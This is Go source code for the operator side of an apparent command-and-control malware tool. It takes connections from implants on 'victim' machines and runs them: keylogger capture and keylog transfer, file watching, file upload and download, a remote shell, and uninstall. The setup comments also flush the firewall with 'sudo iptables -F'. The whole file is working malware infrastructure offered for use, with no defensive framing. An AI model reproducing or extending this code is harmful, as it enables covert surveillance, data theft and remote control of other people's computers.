// Required:
// sudo apt install libnet-dev libpcap-dev -y
// sudo iptables -F
package main 

import (
	"c2/beacon"
    "c2/util"
	"encoding/json"
    "fmt"
    "io/ioutil"
    "os"
    "net"
    "io"
    "context"
)

func startInodeWatchCodeCommander(conn net.Conn, userSelection beacon.UserSelection, ctx context.Context){
    if err := util.NetWrite[string](conn, userSelection.RemotePath); err != nil{
        fmt.Println(err)
        return 
    }
    fmt.Println("Watching", userSelection.RemotePath)
    if err := util.WatchInodeCommander(conn, userSelection.LocalPath, ctx); err != nil{
        fmt.Println("error watching inode:", err)
        return 
    }
}

func startKeyLoggerCodeCommander(conn net.Conn, userSelection beacon.UserSelection){ // context?
  if _, err := io.Copy(os.Stdout, conn); err != nil{
        fmt.Println(err)
        return 
    }
}

func transferKeylogCodeCommander(conn net.Conn, userSelection beacon.UserSelection){
    if err := util.RecvFile(conn, userSelection.LocalPath); err != nil{
        fmt.Println(err)
        return 
    }
}

func sendFileCodeCommander(conn net.Conn, userSelection beacon.UserSelection){
    if err := util.NetWrite[string](conn, userSelection.RemotePath); err != nil{
        fmt.Println(err)
        return 
    }
    if err := util.SendFile(conn, userSelection.LocalPath); err != nil{
        fmt.Println(err)
        return 
    }
}

func recvFileCodeCommander(conn net.Conn, userSelection beacon.UserSelection){
    if err := util.NetWrite[string](conn, userSelection.RemotePath); err != nil{
        fmt.Println(err)
        return 
    }
    if err := util.RecvFile(conn, userSelection.LocalPath); err != nil{
        fmt.Println(err)
        return 
    }
}

func runShellCodeCommander(conn net.Conn, userSelection beacon.UserSelection, ctx context.Context){
    err := util.RemoteShell(conn, util.CommanderAgentTypeEnum, ctx) 
    if err != nil{
        fmt.Println(err)
        return 
    }
}

func uninstallCodeCommander(conn net.Conn, userSelection beacon.UserSelection){
    if _, err := io.Copy(os.Stdout, conn); err != nil{
        fmt.Println(err)
    }
}

func commanderOps(beaconSYN, beaconRSTACK beacon.BeaconStruct, route beacon.RouteStruct, 
    userSelection beacon.UserSelection, ctx context.Context){

    conn, err := util.AcceptTCP(route.SrcIP.String(), int(beaconSYN.Data))
    if conn == nil || err != nil{
        fmt.Println(err)
        return 
    }
    defer conn.Close()
    if beaconRSTACK.Type == beacon.StartInodeWatchCode{
         startInodeWatchCodeCommander(conn, userSelection, ctx)
    }  else if beaconRSTACK.Type == beacon.StartKeyLoggerCode{
         startKeyLoggerCodeCommander(conn, userSelection)
    } else if beaconRSTACK.Type == beacon.UninstallCode{
         uninstallCodeCommander(conn, userSelection)
    } else if beaconRSTACK.Type == beacon.DiscCode{
        fmt.Println("disconnecting from victim...") 
    } else if beaconRSTACK.Type == beacon.TransferKeylogCode{
         transferKeylogCodeCommander(conn, userSelection)
    } else if beaconRSTACK.Type == beacon.SendFileCode{
         sendFileCodeCommander(conn, userSelection)
    } else if beaconRSTACK.Type == beacon.RecvFileCode{
         recvFileCodeCommander(conn, userSelection)
    } else if beaconRSTACK.Type == beacon.RunShellCode{
         runShellCodeCommander(conn, userSelection, ctx)
    } else if beaconRSTACK.Type == beacon.RollbackCode{
        fmt.Println("rolling back")
    }
}

func main() {
    if os.Geteuid() != 0 {
        fmt.Println("run with sudo")
        os.Exit(1)
    }
    f, err := os.Open("commander.json")
    if err != nil {
        fmt.Println(err)
        return
    }
    defer f.Close()
    data, err := ioutil.ReadAll(f)
    if err != nil {
        fmt.Println(err)
        return
    }
    var routeInfo beacon.RouteInfoStruct
    if err := json.Unmarshal(data, &routeInfo); err != nil {
        fmt.Println(err)
        return
    }
	commanderParams, err := beacon.CommanderSetup(routeInfo)
    if err != nil{
        fmt.Println(err)
        return 
    }
    go beacon.Cli(commanderParams)
    beacon.Commander(commanderParams, commanderOps)
}

